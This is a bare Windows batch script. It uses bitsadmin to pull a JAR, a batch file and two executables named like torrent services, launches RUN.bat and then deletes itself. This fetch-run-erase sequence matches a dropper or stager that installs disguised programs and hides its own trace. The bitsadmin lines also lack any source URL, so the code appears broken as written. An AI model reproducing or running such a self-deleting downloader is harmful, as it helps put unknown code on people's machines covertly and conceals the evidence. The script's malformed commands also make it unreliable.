bitsadmin.exe /transfer /priority FOREGROUND "MASTER_JAR.jar" "%~dp0\MASTER_JAR.jar"
bitsadmin.exe /transfer /priority FOREGROUND "RUN.bat" "%~dp0\RUN.bat"
bitsadmin.exe /transfer /priority FOREGROUND "aria.torrent.service.exe" "%~dp0\aria.torrent.service.exe"
bitsadmin.exe /transfer /priority FOREGROUND "ffmpeg.torrent.service.exe" "%~dp0\ffmpeg.torrent.service.exe"
start cmd /c "RUN.bat"
DEL "%~f0" && EXIT
